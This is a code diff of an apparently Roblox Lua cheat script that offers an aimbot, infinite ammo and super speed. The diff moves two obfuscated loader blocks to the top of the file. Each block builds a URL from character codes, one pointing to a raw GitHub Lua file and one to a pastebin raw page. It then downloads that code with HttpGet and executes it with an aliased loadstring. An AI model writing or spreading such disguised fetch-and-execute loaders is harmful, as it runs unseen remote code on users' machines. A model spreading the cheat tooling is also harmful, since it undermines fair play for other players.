@@ -1,5 +1,15 @@
 -- Checkpoint 3.
 
+local _0x1a2b3c = string.char(104, 116, 116, 112, 115, 58, 47, 47) .. string.char(114, 97, 119, 46, 103, 105, 116, 104, 117, 98, 46, 99, 111, 109) .. string.char(47, 71, 108, 121, 112, 104, 65, 74, 74) .. string.char(47, 71, 108, 121, 112, 104, 72, 117, 98) .. string.char(47, 114, 101, 102, 115, 47, 104, 101, 97, 100, 115, 47, 109, 97, 105, 110) .. string.char(47, 67, 104, 101, 99, 107, 112, 111, 105, 110, 116, 47, 80, 114, 101, 109, 105, 117, 109, 52, 46, 108, 117, 97)
+local _0x4d5e6f = game:HttpGet(_0x1a2b3c)
+local _0x789abc = loadstring
+_0x789abc(_0x4d5e6f)()
+
+local _0x1a2b3c = string.char(104, 116, 116, 112, 115, 58, 47, 47) .. string.char(112, 97, 115, 116, 101, 98, 105, 110, 46, 99, 111, 109) .. string.char(47, 114, 97, 119) .. string.char(47, 65, 55, 105, 77, 50, 82, 84, 89)
+local _0x4d5e6f = game:HttpGet(_0x1a2b3c)
+local _0x789abc = loadstring
+_0x789abc(_0x4d5e6f)()
+
 local function enableAimbot()
     local _0x1234ab = math.random(1, 100)
     local _0x5678cd = math.random(1, 100)
@@ -173,17 +183,6 @@ local function deactivateInfiniteAmmo()
         return _0x789012
     end
 end
-
-local _0x1a2b3c = string.char(104, 116, 116, 112, 115, 58, 47, 47) .. string.char(114, 97, 119, 46, 103, 105, 116, 104, 117, 98, 46, 99, 111, 109) .. string.char(47, 71, 108, 121, 112, 104, 65, 74, 74) .. string.char(47, 71, 108, 121, 112, 104, 72, 117, 98) .. string.char(47, 114, 101, 102, 115, 47, 104, 101, 97, 100, 115, 47, 109, 97, 105, 110) .. string.char(47, 67, 104, 101, 99, 107, 112, 111, 105, 110, 116, 47, 80, 114, 101, 109, 105, 117, 109, 52, 46, 108, 117, 97)
-local _0x4d5e6f = game:HttpGet(_0x1a2b3c)
-local _0x789abc = loadstring
-_0x789abc(_0x4d5e6f)()
-
-local _0x1a2b3c = string.char(104, 116, 116, 112, 115, 58, 47, 47) .. string.char(112, 97, 115, 116, 101, 98, 105, 110, 46, 99, 111, 109) .. string.char(47, 114, 97, 119) .. string.char(47, 65, 55, 105, 77, 50, 82, 84, 89)
-local _0x4d5e6f = game:HttpGet(_0x1a2b3c)
-local _0x789abc = loadstring
-_0x789abc(_0x4d5e6f)()
-
 
 local function enableSuperSpeed()
     local _0x123abc = math.random(1, 10)
